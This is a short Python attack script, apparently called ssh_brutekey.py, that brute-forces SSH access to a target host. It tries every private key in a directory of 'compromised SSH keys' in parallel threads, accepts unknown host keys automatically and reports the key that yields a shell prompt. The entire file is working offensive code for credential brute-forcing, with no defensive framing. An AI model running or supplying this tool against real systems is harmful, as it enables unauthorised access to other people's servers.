import pexpect
import argparse
import os
import threading

maxConnections = 5
connection_lock = threading.BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0


def connect(user, host, keyfile, release=True):
    global Stop
    global Fails
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = '-o PasswordAuthentication=no'
        conn_str = f'ssh {user}@{host} -i {keyfile} {opt}'
        child = pexpect.spawn(conn_str)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey,
                            conn_closed, '$', '#', ])
        if ret == 2:
            print('[-] Adding Host to ~/.ssh/known_hosts')
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret == 3:
            print('[-] Connection Closed By Remote Host')
            Fails += 1
        elif ret > 3:
            print(f'[+] Success. {str(keyfile)}')
            Stop = True
    finally:
        if release:
            connection_lock.release()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        usage='python3 ssh_brutekey.py TARGET_HOST '
              '-u USERNAME -d KEY_DIRECTORY')
    parser.add_argument('tgt_host', type=str, metavar='TARGET_HOST',
                        help='specify target host')
    parser.add_argument('-u', type=str, metavar='USERNAME', required=True,
                        help='specify the user name')
    parser.add_argument('-d', type=str, metavar='KEY_DIRECTORY', required=True,
                        help='specify directory containing the compromised SSH '
                             'keys')

    args = parser.parse_args()

    for filename in os.listdir(args.d):
        if Stop:
            print('[*] Exiting: Key Found.')
            exit(0)
        if Fails > 5:
            print('[!] Exiting: Too Many Connections Closed By Remote Host.\n'
                  '[!] Adjust number of simultaneous threads.')
            exit(0)
        connection_lock.acquire()
        fullpath = os.path.join(args.d, filename)
        print(f'[-] Testing keyfile {str(fullpath)}')
        t = threading.Thread(target=connect,
                             args=(args.u, args.tgt_host, fullpath))
        t.start()
